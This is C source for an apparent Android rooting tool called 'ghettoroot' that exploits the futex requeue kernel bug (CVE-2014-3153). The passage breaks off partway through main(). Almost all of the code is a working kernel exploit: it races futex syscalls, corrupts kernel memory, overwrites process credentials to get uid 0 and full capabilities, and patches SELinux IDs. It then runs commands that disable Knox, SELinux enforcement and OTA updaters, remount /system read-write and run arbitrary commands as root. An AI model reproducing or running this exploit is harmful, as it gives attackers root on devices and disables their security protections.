//Android.mk にて、「LOCAL_CFLAGS := -fno-stack-protector -mno-thumb -O0」を指定すること。

// thanks to geohot and...
// https://gist.github.com/fi01/a838dea63323c7c003cd
// https://lkml.org/lkml/2014/5/15/356
// https://github.com/timwr/CVE-2014-3153/blob/master/getroot.c
// http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>

#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12

#define ARRAY_SIZE(a)		(sizeof (a) / sizeof (*(a)))

#define KERNEL_START		0xc0000000

#define LOCAL_PORT		5551

// u can try increasing this if you do not get "Supposedly found cred..."
#define TASKBUF_SIZE  0x100

#define MAX_RETRIES 4

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
	unsigned long flags;
	int preempt_count;
	unsigned long addr_limit;
	struct task_struct *task;

	/* ... */
};

struct kernel_cap_struct {
	unsigned long cap[2];
};

struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};

struct list_head {
	struct list_head *next;
	struct list_head *prev;
};

struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};


struct task_struct_partial {
	struct list_head cpu_timers[3]; 
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};

struct mmsghdr {
	struct msghdr msg_hdr;
	unsigned int  msg_len;
};

struct phonefmt {
	char *version;
	unsigned long method;
	unsigned long align;
	unsigned long limit_offset;
  unsigned long hit_iov;
};

struct phonefmt default_phone = {"", 0, 1, 0, 4};
struct phonefmt new_samsung = {"Linux version 3.4.0-", 1, 1, 0x00001cd4, 4};
struct phonefmt phones[] = {{"Linux version 3.4.0-722276", 1, 1, 0x00001cd4, 4},
                             {"Linux version 3.0.31-", 0, 1, 0, 4}};
struct phonefmt *ph = &default_phone;

//bss
int _swag = 0;
int _swag2 = 0;
struct thread_info *HACKS_final_stack_base = NULL;
pid_t waiter_thread_tid;
pthread_mutex_t done_lock;
pthread_cond_t done;
pthread_mutex_t is_thread_desched_lock;
pthread_cond_t is_thread_desched;
volatile int do_socket_tid_read = 0;
volatile int did_socket_tid_read = 0;
volatile int do_splice_tid_read = 0;
volatile int did_splice_tid_read = 0;
volatile int do_dm_tid_read = 0;
volatile int did_dm_tid_read = 0;
pthread_mutex_t is_thread_awake_lock;
pthread_cond_t is_thread_awake;
int HACKS_fdm = 0;
unsigned long MAGIC = 0;
unsigned long MAGIC_ALT = 0;
pthread_mutex_t *is_kernel_writing;
pid_t last_tid = 0;
char* usercmd = NULL;
char* const* userargv = NULL;
int userargc = 0;
unsigned long exclude_feature = 0;
int tries = 0;
int rooted = 0;

void setaffinity()
{
  pid_t pid = syscall(__NR_getpid);
  int mask=1;
  int syscallres = syscall(__NR_sched_setaffinity, pid, sizeof(mask), &mask);
  if (syscallres)
  {
      printf("Error in the syscall setaffinity: mask=%d=0x%x err=%d=0x%x", mask, mask, errno, errno);
      sleep(2);
      printf("This could be bad, but what the heck... We'll try continuing anyway.");
      sleep(2);
  }
}

int check_kernel_version(void)
{
	char filebuf[0x1000];
	FILE *fp;
	int i;
	char *pdest;
	int ret;
	int kernel_num;
  int foundph = 0;

	memset(filebuf, sizeof filebuf, 0);

	fp = fopen("/proc/version", "rb");
	fread(filebuf, 1, sizeof(filebuf) - 1, fp);
	fclose(fp);

	printf("kernel version: %s\n", filebuf);

	for (i = 0; i < ARRAY_SIZE(phones); i++) {
		pdest = strstr(filebuf, phones[i].version);
		if (pdest != 0) {
			printf("found matching phone: %s\n", phones[i].version);
      memcpy(ph, &phones[i], sizeof(struct phonefmt));
			foundph = 1;
			return 1;
		}
	}

	ret = memcmp(filebuf, new_samsung.version, strlen(new_samsung.version));
	if (ret == 0) {
		pdest = filebuf + strlen(new_samsung.version);
		kernel_num = atoi(pdest);
		printf("Kernel number: %d\n", kernel_num);

		if (kernel_num > 951485) {
			printf("Phone is a 'New Samsung'.\n");
			ph = &new_samsung;
			foundph = 1;
			return 1;
		}
	}

	printf("No matching phone found. Trying default.\n");

	return 0;
}

void prepare_reboot()
{
  sleep(2);
  printf("\nYour device will reboot in 10 seconds.\n");
  printf("This is normal. Thanks for waiting.\n\n");
  printf("10 seconds...\n\n");
  sleep(5);
  printf("5 seconds...\n\n");
  sleep(5);
  printf("Rebooting...\n");
  system("reboot");
  system("su reboot");
}

ssize_t read_pipe(const void *src, void *dest, size_t count)
{
	int pipefd[2];
	ssize_t len;

  printf("Enter %s (%d)\n", __FUNCTION__, __LINE__);
	pipe(pipefd);

  printf("%s(%d) src:%08lx dest:%08lx count:%d\n", __FUNCTION__, __LINE__, (unsigned long)src, (unsigned long)dest, (int)count);
	len = write(pipefd[1], src, count);

	if (len != count) {
		printf("FAILED READ @ %p : %d %d\n", src, (int)len, errno);
		return -1;
	}

	read(pipefd[0], dest, count);

	close(pipefd[0]);
	close(pipefd[1]);
  printf("Exit  %s(%d): len:%d\n", __FUNCTION__, __LINE__, len);

	return len;
}

ssize_t write_pipe(void *dest, const void *src, size_t count)
{
	int pipefd[2];
	ssize_t len;

  printf("   In %s(%d) dest:%08lx src:%08lx count:%d\n", __FUNCTION__, __LINE__, (unsigned long)dest, (unsigned long)src, (int)count);
	pipe(pipefd);

	write(pipefd[1], src, count);
	len = read(pipefd[0], dest, count);

	if (len != count) {
		printf("FAILED WRITE @ %p : %d %d\n", dest, (int)len, errno);
		//prepare_reboot();
    return -1;
	}

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

int run_custom_command(const char* usercmd, char* const* userargv)
{
  int ret = 0;
	pid_t pid = fork();
	if (pid == 0) {	//child
    if ((ret = execvp(usercmd, userargv)) != 0) {
      printf("User command failed (%d)", ret);
      perror("");
    }
    exit(ret);
    return ret;
	} else {
    if (wait(&ret) == -1) {
      ret = -1;
    }
    if (ret == -1) perror("Error running user command");
    else if (ret != 0) printf("Error running user command: %d", ret);
    return ret;
  }
}

void get_root(int signum)
{
	struct thread_info stackbuf;
	unsigned long taskbuf[TASKBUF_SIZE];
	struct cred *cred;
	struct cred credbuf;
	struct task_security_struct *security;
	struct task_security_struct securitybuf;
	pid_t pid;
	int i;
	int ret;
	FILE *fp;

  printf("Enter %s (%d; tid: %4x)\n", __FUNCTION__, __LINE__, syscall(__NR_gettid));
	pthread_mutex_lock(&is_thread_awake_lock);
	pthread_cond_signal(&is_thread_awake);
	pthread_mutex_unlock(&is_thread_awake_lock);

  printf("%s %d\n", __FUNCTION__, __LINE__);
	if (HACKS_final_stack_base == NULL) {
		static unsigned long new_addr_limit = 0xffffffff;
		char *slavename;
		int pipefd[2];
		char readbuf[0x100];

		printf("cpid1 resumed\n");

		pthread_mutex_lock(is_kernel_writing);

		HACKS_fdm = open("/dev/ptmx", O_RDWR);
		unlockpt(HACKS_fdm);
		slavename = ptsname(HACKS_fdm);
    printf("   In %s(%d): HACKS_fdm = %d [%s]\n", __FUNCTION__, __LINE__, HACKS_fdm, slavename);

		open(slavename, O_RDWR);

		if (ph->limit_offset != 0) {
      printf("   In %s(%d): ph->limit_offset != 0\n", __FUNCTION__, __LINE__);
			pipe(pipefd);

			do_splice_tid_read = 1;
      printf("%s %d\n", __FUNCTION__, __LINE__);
			while (1) {
				if (did_splice_tid_read != 0) {
					break;
				}
			}

      printf("%s %d\n", __FUNCTION__, __LINE__);
			syscall(__NR_splice, HACKS_fdm, NULL, pipefd[1], NULL, sizeof readbuf, 0);
		}
		else {
      printf("   In %s(%d): ph->limit_offset == 0\n", __FUNCTION__, __LINE__);
			do_splice_tid_read = 1;
			while (1) {
				if (did_splice_tid_read != 0) {
					break;
				}
			}

			read(HACKS_fdm, readbuf, sizeof readbuf);
      printf("   In %s(%d): read(HACKS_fdm, readbuf, sizeof readbuf);\n", __FUNCTION__, __LINE__);
		}

    printf("%s %d\n", __FUNCTION__, __LINE__);
		if (write_pipe(&HACKS_final_stack_base->addr_limit, &new_addr_limit, sizeof new_addr_limit) == -1) return;

    printf("%s %d\n", __FUNCTION__, __LINE__);
		pthread_mutex_unlock(is_kernel_writing);

    printf("%s %d\n", __FUNCTION__, __LINE__);
		while (1) {
			sleep(10);
		}
	}

	printf("cpid3 resumed\n");

	pthread_mutex_lock(is_kernel_writing);

	printf("WOOT\n");

	if (read_pipe(HACKS_final_stack_base, &stackbuf, sizeof stackbuf) == -1) return;
  printf("ti.task=%08lx .flags=%08lx .preempt_count=%u .addr_limit=%08lx\n",
    (unsigned long)stackbuf.task, stackbuf.flags, stackbuf.preempt_count, (unsigned long)stackbuf.addr_limit);

	if (read_pipe(stackbuf.task, taskbuf, sizeof taskbuf) == -1) return;

	cred = NULL;
	security = NULL;
	pid = 0;

	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
		struct task_struct_partial *task = (void *)&taskbuf[i];
    printf("%08lx ", taskbuf[i]);

		if (task->cpu_timers[0].next == task->cpu_timers[0].prev && (unsigned long)task->cpu_timers[0].next > KERNEL_START
		 && task->cpu_timers[1].next == task->cpu_timers[1].prev && (unsigned long)task->cpu_timers[1].next > KERNEL_START
		 && task->cpu_timers[2].next == task->cpu_timers[2].prev && (unsigned long)task->cpu_timers[2].next > KERNEL_START
		 && task->real_cred == task->cred && (unsigned long)task->cred > KERNEL_START) {
      printf("\nSupposedly found credential at taskbuf[%d]: %08lx", i, (unsigned long)task->cred);
			cred = task->cred;
			break;
		}
	}
  printf("\n");

	if (read_pipe(cred, &credbuf, sizeof credbuf) == -1) return;

	security = credbuf.security;

	if ((unsigned long)security > KERNEL_START && (unsigned long)security < 0xffff0000) {
		if (read_pipe(security, &securitybuf, sizeof securitybuf) == -1) return;

		if (securitybuf.osid != 0
		 && securitybuf.sid != 0
		 && securitybuf.exec_sid == 0
		 && securitybuf.create_sid == 0
		 && securitybuf.keycreate_sid == 0
		 && securitybuf.sockcreate_sid == 0) {
			securitybuf.osid = 1;
			securitybuf.sid = 1;

			printf("YOU ARE A SCARY PHONE\n");

			if (write_pipe(security, &securitybuf, sizeof securitybuf) == -1) return;
		}
	}

	credbuf.uid = 0;
	credbuf.gid = 0;
	credbuf.suid = 0;
	credbuf.sgid = 0;
	credbuf.euid = 0;
	credbuf.egid = 0;
	credbuf.fsuid = 0;
	credbuf.fsgid = 0;

	credbuf.cap_inheritable.cap[0] = 0xffffffff;
	credbuf.cap_inheritable.cap[1] = 0xffffffff;
	credbuf.cap_permitted.cap[0] = 0xffffffff;
	credbuf.cap_permitted.cap[1] = 0xffffffff;
	credbuf.cap_effective.cap[0] = 0xffffffff;
	credbuf.cap_effective.cap[1] = 0xffffffff;
	credbuf.cap_bset.cap[0] = 0xffffffff;
	credbuf.cap_bset.cap[1] = 0xffffffff;

	if (write_pipe(cred, &credbuf, sizeof credbuf) == -1) return;

	pid = syscall(__NR_gettid);

	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
		static unsigned long write_value = 1;

		if (taskbuf[i] == pid) {
			if (write_pipe(((void *)stackbuf.task) + (i << 2), &write_value, sizeof write_value) == -1) return;

			if (getuid() != 0) {
				printf("ROOT FAILED\n");
        //prepare_reboot();
        return;
			}
			else {	//rooted
				break;
			}
		}
	}

  rooted = 1;
	//rooted

  ret = system("/system/bin/touch /data/local/tmp/foo");
  if (ret != 0) {
    perror("touch /data/local/tmp/foo: COMMAND FAILED");
    printf("Cannot proceed. Root failed.\n");
    //prepare_reboot();
    return;
  }

  ret = system("/system/bin/touch /dev/rooted");
  if (ret != 0) {
    printf("touch /dev/rooted: COMMAND FAILED\n");
    sleep(1);
  }

  system("/system/bin/ls -l /dev/rooted");
  if (ret != 0) {
    printf("ls -l /dev/rooted: COMMAND FAILED\n");
    sleep(1);
  }

  if (!(exclude_feature & 2)) {
    system("pm disable com.sec.knox.seandroid");
    perror("Disabling Knox");
  }

  if (!(exclude_feature & 8)) {
    system("setenforce 0");
    perror("Disabling SEAndroid");
    
    if (!(exclude_feature & 2)) {
      system("pm disable com.sec.knox.seandroid");
      perror("Disabling Knox (again)");
    }
  }
  
  if (!(exclude_feature & 4)) {
    system("pm disable com.policydm");
    perror("Disabling Policy Updater");
    
    system("pm disable com.LocalFota");
    perror("Disabling Local OTA Updates");
    
    system("pm disable com.sec.android.fwupgrade");
    perror("Disabling FWUpgrade");
    
    system("pm disable com.samsung.sdm");
    perror("Disabling Samsung Data Migration tool");
  }
  
  if (!(exclude_feature & 16)) {    
    system("mount -o remount,rw /system");
    perror("Remounting /system");
    
    system("mount -o remount,rw /");
    perror("Remounting /");
    
    system("mkdir /tmp");
    system("ln -s /data/local/tmp/busybox /sbin/unzip");
    system("chmod 0755 /data/local/tmp/busybox");
  }

  if (!(exclude_feature & 1)) {
    if(system("/data/local/tmp/busybox unzip -o /data/local/tmp/*SuperSU*.zip META-INF/com/google/android/update* -d /data/local/tmp/") != 0) {
      perror("Could not find/unzip SuperSU");
      printf("Please place an UPDATE-SuperSU-*.zip file in the main folder before running the install script\n");
      prepare_reboot();
    }
    // All this stuff is here because SuperSU spazzes out and finds it necessary to
    // move around some of the /system/app APKs. Sometimes they don't come back.
    system("/system/bin/cp -a /system/app/Maps.apk /system/app/Maps.apk.prespaz");
    system("/system/bin/cp -a /system/app/GMS_Maps.apk /system/app/GMS_Maps.apk.prespaz");
    system("/system/bin/cp -a /system/app/YouTube.apk /system/app/YouTube.apk.prespaz");
    // Execute the SuperSU updater script (update-binary).
    if (system("sh /data/local/tmp/META-INF/com/google/android/update-binary \"\" 1 /data/local/tmp/*SuperSU*.zip") != 0) {
      perror("Installing SuperSU failed");
    }
    // Restore things that might have gotten lost...
    system("/system/bin/mv /system/app/Maps.apk.prespaz /system/app/Maps.apk");
    system("/system/bin/mv /system/app/GMS_Maps.apk.prespaz /system/app/GMS_Maps.apk");
    system("/system/bin/mv /system/app/YouTube.apk.prespaz /system/app/YouTube.apk");
  }

  printf("%s %d\n", __FUNCTION__, __LINE__);
  if (usercmd) {
custom_command:
    run_custom_command(usercmd, userargv);
  }
  
	printf("Thank you for choosing ghettoroot. Please enjoy your stay.\n");
  prepare_reboot();

  printf("%s %d\n", __FUNCTION__, __LINE__);
	pthread_mutex_lock(&done_lock);
  printf("%s %d\n", __FUNCTION__, __LINE__);
	pthread_cond_signal(&done);
  printf("%s %d\n", __FUNCTION__, __LINE__);
	pthread_mutex_unlock(&done_lock);

	while (1) {
		sleep(10);
	}

	return;
}

void *make_sigaction(void *arg)
{
	int prio;
	struct sigaction act;
	int ret;

  printf("Enter %s (%d)\n", __FUNCTION__, __LINE__);
	prio = (int)arg;
	last_tid = syscall(__NR_gettid);

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_cond_signal(&is_thread_desched);

	act.sa_handler = get_root;
	act.sa_mask = 0;
	act.sa_flags = 0;
	act.sa_restorer = NULL;
	sigaction(12, &act, NULL);

	setpriority(PRIO_PROCESS, 0, prio);

	pthread_mutex_unlock(&is_thread_desched_lock);

	do_dm_tid_read = 1;

	while (did_dm_tid_read == 0) {
		;
	}

	ret = syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
	printf("futex dm: %d %d\n", ret, errno);

	while (1) {
		sleep(10);
	}

	return NULL;
}

pid_t wake_actionthread(int prio)
{
	pthread_t th4;
	pid_t pid;
	char filename[256];
	FILE *fp;
	char filebuf[0x1000];
	char *pdest;
	int vcscnt, vcscnt2;

  printf("Enter %s (%d)\n", __FUNCTION__, __LINE__);
	do_dm_tid_read = 0;
	did_dm_tid_read = 0;

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_create(&th4, 0, make_sigaction, (void *)prio);
	pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);

	pid = last_tid;

	sprintf(filename, "/proc/self/task/%d/status", pid);

	fp = fopen(filename, "rb");
	if (fp == 0) {
		vcscnt = -1;
	}
	else {
		fread(filebuf, 1, sizeof filebuf, fp);
		pdest = strstr(filebuf, "voluntary_ctxt_switches");
		pdest += 0x19;
		vcscnt = atoi(pdest);
		fclose(fp);
	}

	while (do_dm_tid_read == 0) {
		usleep(10);
	}

	did_dm_tid_read = 1;

	while (1) {
		sprintf(filename, "/proc/self/task/%d/status", pid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt2 = -1;
		}
		else {
			fread(filebuf, 1, sizeof filebuf, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt2 = atoi(pdest);
			fclose(fp);
		}

		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);

	}

	pthread_mutex_unlock(&is_thread_desched_lock);

  printf("Exit  %s (%d)\n", __FUNCTION__, __LINE__);
	return pid;
}

int make_socket(void)
{
  printf("Enter %s (%d)\n", __FUNCTION__, __LINE__);
	int sockfd;
	struct sockaddr_in addr = {0};
	int ret;
	int sock_buf_size;

	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
	if (sockfd < 0) {
		printf("socket failed\n");
		usleep(10);
	}
	else {
		addr.sin_family = AF_INET;
		addr.sin_port = htons(LOCAL_PORT);
		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	}

	while (1) {
		ret = connect(sockfd, (struct sockaddr *)&addr, 16);
		if (ret >= 0) {
			break;
		}
		usleep(10);
	}

	sock_buf_size = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

  printf("Exit  %s (%d)\n", __FUNCTION__, __LINE__);
	return sockfd;
}

void *send_magicmsg(void *arg)
{
	int sockfd;
	struct mmsghdr msgvec[1];
	struct iovec iov[8];
	unsigned long databuf[0x20];
	int i;
	int ret;

  printf("Enter %s (%d)\n", __FUNCTION__, __LINE__);

	waiter_thread_tid = syscall(__NR_gettid);
	setpriority(PRIO_PROCESS, 0, 12);

	sockfd = make_socket();

	for (i = 0; i < ARRAY_SIZE(databuf); i++) {
		databuf[i] = MAGIC;
	}

  // tbh i'm not really sure how this is supposed to look or work
  // but it is working with note 2 as is with modstring 0 1 0 4
  // and that is all i care about right now.
  // see http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/
  for (i = 0; i < 8; i++) {
    iov[i].iov_base = (void *)MAGIC;
    if (ph->align == 0) {
      if (i==ph->hit_iov) {
        iov[i].iov_len = MAGIC_ALT;
      }
      else {
        iov[i].iov_len = 0x10;
      }
    }
    else {
      iov[i].iov_len = MAGIC_ALT;
    }
  }

	msgvec[0].msg_hdr.msg_name = databuf;
	msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
	msgvec[0].msg_hdr.msg_iov = iov;
	msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(iov);
	msgvec[0].msg_hdr.msg_control = databuf;
	msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
	msgvec[0].msg_hdr.msg_flags = 0;
	msgvec[0].msg_len = 0;

	syscall(__NR_futex, &_swag, FUTEX_WAIT_REQUEUE_PI, 0, 0, &_swag2, 0);

	do_socket_tid_read = 1;

	while (1) {
		if (did_socket_tid_read != 0) {
			break;
		}
	}

	ret = 0;

	switch (ph->method) {
	case 0:
		while (1) {
			ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
			if (ret <= 0) {
				break;
			}
		}

		break;

	case 1:
		ret = syscall(__NR_recvmmsg, sockfd, msgvec, 1, 0, NULL);
		break;

	case 2:
		while (1) {
			ret = sendmsg(sockfd, &(msgvec[0].msg_hdr), 0);
			if (ret <= 0) {
				break;
			}
		}
		break;

	case 3:
		ret = recvmsg(sockfd, &(msgvec[0].msg_hdr), 0);
		break;
	}

	if (ret < 0) {
		perror("SOCKSHIT");
	}

	printf("EXIT WTF\n");

	while (1) {
		sleep(10);
	}

	return NULL;
}

static inline setup_exploit(unsigned long mem)
{
  printf("Enter %s (%d)\n", __FUNCTION__, __LINE__);
	*((unsigned long *)(mem - 0x04)) = 0x81;
	*((unsigned long *)(mem + 0x00)) = mem + 0x20;
	*((unsigned long *)(mem + 0x08)) = mem + 0x28;
	*((unsigned long *)(mem + 0x1c)) = 0x85;
	*((unsigned long *)(mem + 0x24)) = mem;
	*((unsigned long *)(mem + 0x2c)) = mem + 8;
  printf("Exit  %s (%d)\n", __FUNCTION__, __LINE__);
}

void *search_goodnum(void *arg)
{
	int ret;
	char filename[256];
	FILE *fp;
	char filebuf[0x1000];
	char *pdest;
	int vcscnt, vcscnt2;
	unsigned long magicval;
	pid_t pid;
	unsigned long goodval, goodval2;
	unsigned long addr, setaddr;
	int i;
	char buf[0x1000];

  printf("Enter %s (%d)\n", __FUNCTION__, __LINE__);
	syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

	while (1) {
		ret = syscall(__NR_futex, &_swag, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag);
		if (ret == 1) {
			break;
		}
		usleep(10);
	}

	wake_actionthread(6);
	wake_actionthread(7);

	_swag2 = 0;
	do_socket_tid_read = 0;
	did_socket_tid_read = 0;

	syscall(__NR_futex, &_swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag2);

	while (1) {
		if (do_socket_tid_read != 0) {
			break;
		}
	}

	sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);

	fp = fopen(filename, "rb");
	if (fp == 0) {
		vcscnt = -1;
	}
	else {
		fread(filebuf, 1, sizeof filebuf, fp);
		pdest = strstr(filebuf, "voluntary_ctxt_switches");
		pdest += 0x19;
		vcscnt = atoi(pdest);
		fclose(fp);
	}

	did_socket_tid_read = 1;

	while (1) {
		sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt2 = -1;
		}
		else {
			fread(filebuf, 1, sizeof filebuf, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt2 = atoi(pdest);
			fclose(fp);
		}

		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);
	}

	printf("starting the dangerous things\n");

	setup_exploit(MAGIC_ALT);
	setup_exploit(MAGIC);
  printf("%s %d\nMAGIC: %08lx\nMAGIC_ALT: %08lx\n", __FUNCTION__, __LINE__, MAGIC, MAGIC_ALT);

	magicval = *((unsigned long *)MAGIC);
  printf("magicval: %08lx\n", magicval);

	wake_actionthread(11);

	if (*((unsigned long *)MAGIC) == magicval) {
		printf("MAGIC = MAGIC_ALT;\n");
		MAGIC = MAGIC_ALT;
	}

  printf("%s %d\n", __FUNCTION__, __LINE__);
	while (1) {
		is_kernel_writing = (pthread_mutex_t *)malloc(4);
		pthread_mutex_init(is_kernel_writing, NULL);

		setup_exploit(MAGIC);

		pid = wake_actionthread(11);

		goodval = *((unsigned long *)MAGIC) & 0xffffe000;

		printf("%p is a good number\n", (void *)goodval);

		do_splice_tid_read = 0;
		did_splice_tid_read = 0;

		pthread_mutex_lock(&is_thread_awake_lock);

		kill(pid, 12);

		pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
		pthread_mutex_unlock(&is_thread_awake_lock);

		while (1) {
			if (do_splice_tid_read != 0) {
				break;
			}
			usleep(10);
		}

		sprintf(filename, "/proc/self/task/%d/status", pid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt = -1;
		}
		else {
			fread(filebuf, 1, sizeof filebuf, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt = atoi(pdest);
			fclose(fp);
		}

		did_splice_tid_read = 1;

		while (1) {
			sprintf(filename, "/proc/self/task/%d/status", pid);
			fp = fopen(filename, "rb");
			if (fp == 0) {
				vcscnt2 = -1;
			}
			else {
				fread(filebuf, 1, sizeof filebuf, fp);
				pdest = strstr(filebuf, "voluntary_ctxt_switches");
				pdest += 19;
				vcscnt2 = atoi(pdest);
				fclose(fp);
			}

			if (vcscnt2 != vcscnt + 1) {
				break;
			}
			usleep(10);
		}

		goodval2 = 0;
		if (ph->limit_offset != 0) {
			addr = (unsigned long)mmap((unsigned long *)0xbef000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
			if (addr != 0xbef000) {
				continue;
			}

			setup_exploit(0xbeffe0);

			*((unsigned long *)0xbf0004) = 0xbef000 + ph->limit_offset + 1;

			*((unsigned long *)MAGIC) = 0xbf0000;

			wake_actionthread(10);

			goodval2 = *((unsigned long *)0x00bf0004);

			munmap((unsigned long *)0xbef000, 0x2000);

			goodval2 <<= 8;
			if (goodval2 < KERNEL_START) {

				setaddr = (goodval2 - 0x1000) & 0xfffff000;

				addr = (unsigned long)mmap((unsigned long *)setaddr, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
				if (addr != setaddr) {
					continue;
				}

				setup_exploit(goodval2 - 0x20);
				*((unsigned long *)(goodval2 + 4)) = goodval + ph->limit_offset;
				*((unsigned long *)MAGIC) = goodval2;

				wake_actionthread(10);

				goodval2 = *((unsigned long *)(goodval2 + 4));

				munmap((unsigned long *)setaddr, 0x2000);
			}
		}
		else {
			setup_exploit(MAGIC);
			*((unsigned long *)(MAGIC + 0x24)) = goodval + 8;

			wake_actionthread(12);
			goodval2 = *((unsigned long *)(MAGIC + 0x24));
		}

		printf("%p is also a good number\n", (void *)goodval2);

		for (i = 0; i < 9; i++) {
			setup_exploit(MAGIC);

			pid = wake_actionthread(10);

			if (*((unsigned long *)MAGIC) < goodval2) {
				HACKS_final_stack_base = (void *)(*((unsigned long *)MAGIC) & 0xffffe000);

				pthread_mutex_lock(&is_thread_awake_lock);

				kill(pid, 12);

				pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
				pthread_mutex_unlock(&is_thread_awake_lock);

				printf("GOING\n");

				write(HACKS_fdm, buf, sizeof buf);

				while (1) {
					sleep(10);
				}
			}

		}
	}

	return NULL;
}

void *accept_socket(void *arg)
{
	int sockfd;
	int yes;
	struct sockaddr_in addr = {0};
	int ret;

  printf("Enter %s (%d)\n", __FUNCTION__, __LINE__);
	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);

	yes = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(LOCAL_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	listen(sockfd, 1);

	while(1) {
		ret = accept(sockfd, NULL, NULL);
		if (ret < 0) {
			printf("**** SOCK_PROC FAILED ****\n");
			while(1) {
				sleep(10);
			}
		}
		else {
			printf("Socket tastefully accepted.\n");
		}
	}

	return NULL;
}

int init_exploit(void)
{
	unsigned long addr;
	pthread_t th1, th2, th3;

	pthread_create(&th1, NULL, accept_socket, NULL);

	addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	addr += 0x800;
	MAGIC = addr;
	if ((long)addr >= 0) {
		printf("first mmap failed?\n");
		while (1) {
			sleep(10);
		}
	}

	addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	addr += 0x800;
	MAGIC_ALT = addr;
	if (addr > 0x110000) {
		printf("second mmap failed?\n");
		while (1) {
			sleep(10);
		}
	}

	pthread_mutex_lock(&done_lock);
	pthread_create(&th2, NULL, search_goodnum, NULL);
	pthread_create(&th3, NULL, send_magicmsg, NULL);
	pthread_cond_wait(&done, &done_lock);
  return rooted;
}

int main(int argc, char **argv)
{
  char* endptr;
  int cmdlen = 1;
  long narg = 0;
  ph = malloc(sizeof(struct phonefmt));

  if (argc > 1) {
    if (strcmp(argv[1], "-?") == 0 || strcmp(argv[1], "/?") == 0 || strcmp(argv[1], "--help") == 0) {
      printf("Usage: ghettoroot METHOD ALIGN LIMIT_OFFSET HIT_IOV [EXCLUDE_FEATURE] [USERCMD] [USERARGV]\n");
      printf("     METHOD(0-3): 0-sendmmsg, 1-recvmmsg, 2-sendmsg, 3-recvmsg\n");
      printf("        maybe one will work rather than another, but probably not");
      printf("     *ALIGN(0-1): (on/off) attack all 8 IOVs hit with MAGIC\n");
      printf("              ALIGN behavior may not be as originally intended.*");
      printf("    LIMIT_OFFSET: (0-8192) struct offset of thread_info.addr_limit, multiple of 4\n");
      printf("     (if desperate, download manufacturer's kernel sources to investigate headers)\n");
      printf("    HIT_IOV(0-7): offset to target for rt_waiter variable owning, default 4\n");
      printf("      (see vulnerable futex_wait_requeue_pi function for your kernel if needed)\n");
